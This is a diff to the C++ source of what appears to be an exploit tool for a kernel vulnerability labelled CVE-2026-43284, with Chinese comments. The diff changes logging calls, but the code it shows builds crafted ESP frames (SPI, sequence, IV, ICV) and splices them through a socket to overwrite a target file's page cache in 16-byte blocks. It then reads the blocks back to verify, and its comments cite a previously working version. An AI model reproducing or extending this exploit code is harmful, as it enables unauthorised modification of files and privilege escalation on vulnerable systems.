@@ -20,7 +20,7 @@
  */
 #include <fcntl.h>
 #include <unistd.h>
-#include "jni/gl_log.hpp"
+#include "support/gl_log.h"
 #include <array>
 #include <cstddef>
 #include <cstdint>
@@ -115,7 +115,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
              *  fork 一次而没有人察觉（真机上就是 74 ms/块）。所以它在路由起来时就被拒，而不是等到
              *  1470 块写完之后从耗时里读出来。 */
             if (doors_.bridge_mode() != splice_.bridge_mode()) {
-                GL_LOGI("window: refused bridge-mode mismatch doors=%d surface=%d",
+                error("window: refused bridge-mode mismatch doors=%d surface=%d",
                         doors_.bridge_mode(), splice_.bridge_mode());
                 return false;
             }
@@ -132,7 +132,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             /* 门开之后的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:189-195
              *  —— 那边 write16 用的就是 sa.spi / ctx.next_seq 与十六字节向量；next_seq 从 1 起）。
              *  fd：file_fd 是载体的门（远端为 -1，此时页由 patch #1 写下的 helper 送进管道）。 */
-            GL_LOGI("window: doors open spi=0x%08x icv_len=%u next_seq=%u file_fd=%d socket_fd=%d bridge_mode=%d",
+            verbose("window: doors open spi=0x%08x icv_len=%u next_seq=%u file_fd=%d socket_fd=%d bridge_mode=%d",
                     spi_, static_cast<unsigned>(icv_len_), next_seq_, doors_.file_fd(), doors_.socket_fd(),
                     doors_.bridge_mode());
             return true;
@@ -166,7 +166,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             /* 组帧的每段长度与头字段（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:189-206
              *  —— 那边 compute_cbc_iv 之后依次 store_be32(SPI)、store_be32(seq)、拼 IV，再算 ICV；
              *  :243-251 一个报文 = header_iv + 页 + ICV；ICV 截断长度来自 sa.icv_len）。 */
-            GL_LOGI("frame: spi=0x%08x seq=%u icv_len=%u iv=%02x%02x%02x%02x old=%02x%02x%02x%02x want=%02x%02x%02x%02x",
+            verbose("frame: spi=0x%08x seq=%u icv_len=%u iv=%02x%02x%02x%02x old=%02x%02x%02x%02x want=%02x%02x%02x%02x",
                     spi_, next_seq_, static_cast<unsigned>(icv_len_),
                     static_cast<unsigned>(iv[0]), static_cast<unsigned>(iv[1]),
                     static_cast<unsigned>(iv[2]), static_cast<unsigned>(iv[3]),
@@ -174,7 +174,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                     static_cast<unsigned>(old_block[2]), static_cast<unsigned>(old_block[3]),
                     static_cast<unsigned>(block[0]), static_cast<unsigned>(block[1]),
                     static_cast<unsigned>(block[2]), static_cast<unsigned>(block[3]));
-            GL_LOGI("frame: segments hdr=%zu vector=%zu cipher=%zu icv=%zu total=%zu file_fd=%d socket=%d helper=%d",
+            verbose("frame: segments hdr=%zu vector=%zu cipher=%zu icv=%zu total=%zu file_fd=%d socket=%d helper=%d",
                     kHeaderBytes, kBlockBytes, kBlockBytes, static_cast<std::size_t>(icv_len_),
                     kHeaderBytes + 2U * kBlockBytes + static_cast<std::size_t>(icv_len_),
                     doors_.file_fd(), doors_.socket_fd(), doors_.file_fd() < 0 ? 1 : 0);
@@ -192,10 +192,10 @@ namespace ghostlock::backend::cve_2026_43284::landing {
              * 发送失败/序号未递增等异常行在下方逐块保留，定位不受影响。
              */
             if ((position % 512ULL) == 0ULL) {
-                GL_LOGI("write_block enter pos=%llu fd=%d sock=%d serve=%d",
+                verbose("write_block enter pos=%llu fd=%d sock=%d serve=%d",
                         static_cast<unsigned long long>(position), doors_.file_fd(), doors_.socket_fd(),
                         splice_.can_serve_page() ? 1 : 0);
-                GL_LOGI("window: send seq=%u offset=%llu hdr=%02x%02x%02x%02x%02x%02x%02x%02x", next_seq_,
+                verbose("window: send seq=%u offset=%llu hdr=%02x%02x%02x%02x%02x%02x%02x%02x", next_seq_,
                             static_cast<unsigned long long>(position),
                             datagram[0], datagram[1], datagram[2], datagram[3],
                             datagram[4], datagram[5], datagram[6], datagram[7]);
@@ -212,9 +212,9 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             splice_.compute_icv(datagram.data(), prefix, hmac_key_, icv_len_,
                                 datagram.data() + prefix);
             if (!splice_.splice_one(doors_.socket_fd(), datagram.data(), prefix + icv_len_, position)) {
-                GL_LOGI("window: splice NOT sent offset=%llu err=%d seq=%u (20=hdr 21=page 22=len 23=suffix)",
+                verbose("window: splice NOT sent offset=%llu err=%d seq=%u (20=hdr 21=page 22=len 23=suffix)",
                         static_cast<unsigned long long>(position), splice_.last_error(), next_seq_);
-                GL_LOGI("frame not sent: next_seq stays=%u file_fd=%d", next_seq_, doors_.file_fd());
+                verbose("frame not sent: next_seq stays=%u file_fd=%d", next_seq_, doors_.file_fd());
                 outcome_ = WriteOutcome::NotSent;
                 return false;
             }
@@ -222,7 +222,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             next_seq_ += 1U;
             /* 发送字节数与序号的前后值（成功历史：pagecache.cpp:243-261
              *  —— 那边 total = header_iv + 页 + icv_len 交给 splice；只有 sent == total 才 next_seq += 1）。 */
-            GL_LOGI("frame sent: offset=%llu bytes=%zu seq_used=%u next_seq=%u socket=%d file_fd=%d",
+            verbose("frame sent: offset=%llu bytes=%zu seq_used=%u next_seq=%u socket=%d file_fd=%d",
                     static_cast<unsigned long long>(position), prefix + static_cast<std::size_t>(icv_len_),
                     next_seq_ - 1U, next_seq_, doors_.socket_fd(), doors_.file_fd());
             outcome_ = WriteOutcome::Wrote;
@@ -240,7 +240,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         [[nodiscard]] bool read_block(std::uint64_t position,
                                       std::uint8_t out[kBlockBytes]) noexcept override {
             if (!splice_.can_read_page()) {
-                GL_LOGI("read_block: not open can_read=%d fd=%d pos=%llu",
+                verbose("read_block: not open can_read=%d fd=%d pos=%llu",
                         splice_.can_read_page() ? 1 : 0, doors_.file_fd(),
                         static_cast<unsigned long long>(position));
                 read_outcome_ = ReadOutcome::NotOpen;
@@ -253,19 +253,19 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             {
                 std::uint8_t direct[kBlockBytes] = {};
                 const long got = ::pread(doors_.file_fd(), direct, kBlockBytes, static_cast<off_t>(position));
-                GL_LOGI("read_block: fd=%d pos=%llu pread=%ld direct=%02x%02x%02x%02x",
+                verbose("read_block: fd=%d pos=%llu pread=%ld direct=%02x%02x%02x%02x",
                         doors_.file_fd(), static_cast<unsigned long long>(position), got,
                         direct[0], direct[1], direct[2], direct[3]);
                 char link[256] = {};
                 char link_path[64] = {};
                 std::snprintf(link_path, sizeof(link_path), "/proc/self/fd/%d", doors_.file_fd());
                 const ssize_t got_link = ::readlink(link_path, link, sizeof(link) - 1U);
-                GL_LOGI("read_block: fd=%d flags=0x%x link=%s", doors_.file_fd(),
+                verbose("read_block: fd=%d flags=0x%x link=%s", doors_.file_fd(),
                         ::fcntl(doors_.file_fd(), F_GETFL), got_link > 0 ? link : "(none)");
             }
             if (splice_.read_at(doors_.file_fd(), block, kBlockBytes, position) !=
                 static_cast<long>(kBlockBytes)) {
-                GL_LOGI("read_block: incomplete fd=%d pos=%llu len=%zu",
+                verbose("read_block: incomplete fd=%d pos=%llu len=%zu",
                         doors_.file_fd(), static_cast<unsigned long long>(position), kBlockBytes);
                 read_outcome_ = ReadOutcome::Incomplete;
                 return false;
@@ -274,7 +274,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 out[i] = block[i];
             }
             /* 回读的结果（成功历史：pagecache.cpp:116-166 的 read_block —— 只有整块读回才算成）。 */
-            GL_LOGI("read_block: ok fd=%d pos=%llu len=%zu head=%02x%02x%02x%02x",
+            verbose("read_block: ok fd=%d pos=%llu len=%zu head=%02x%02x%02x%02x",
                     doors_.file_fd(), static_cast<unsigned long long>(position), kBlockBytes,
                     static_cast<unsigned>(block[0]), static_cast<unsigned>(block[1]),
                     static_cast<unsigned>(block[2]), static_cast<unsigned>(block[3]));
@@ -292,7 +292,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         void adopt_sequence(std::uint32_t next) noexcept override {
             /* 序号的前后值（成功历史：pagecache.cpp:192 store_be32(header_iv + kEspSeqOffset, ctx.next_seq)
              *  —— 同一个 SA 上的后续窗口必须接着前一个的序号，续接发生在写之前）。 */
-            GL_LOGI("window: adopt_sequence from=%u to=%u", next_seq_, next == 0U ? 1U : next);
+            verbose("window: adopt_sequence from=%u to=%u", next_seq_, next == 0U ? 1U : next);
             next_seq_ = next == 0U ? 1U : next;
         }
 
